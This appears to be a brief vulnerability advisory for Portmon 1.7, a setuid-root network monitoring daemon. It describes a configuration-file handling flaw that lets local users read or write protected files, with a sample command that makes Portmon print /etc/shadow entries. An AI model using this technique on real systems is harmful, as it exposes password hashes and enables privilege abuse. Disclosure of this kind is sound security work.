Subject: Portmon file arbitrary read/write access vulnerability




Package:       Portmon
Auth:          http://www.aboleo.net/
Version(s):    1.7 (prior ?)
Vulnerability: File arbitrary read/write access
vulnerability

Portmon is a network service monitoring daemon
(http://www.aboleo.net/software/portmon/).
"In order to use ping support, Portmon must run as root
or be installed setuid with root permissions
due to the fact that it must open up a raw socket."
The product suffer from a security problem that allows
any local user to read/write protected files on the system.
This is dude to a hole in the way the program handles
loading of two configuration files: host file/log file.

Example (read):

[lucae@...ux lucae]$portmon -c /etc/shadow

Unable to resolve hostname
root:$1$nsqR6sX$ItXXXXXXXXXXXXXXXXX.:12172:0:99999:7:::
Unable to resolve hostname bin:*:12172:0:99999:7:::
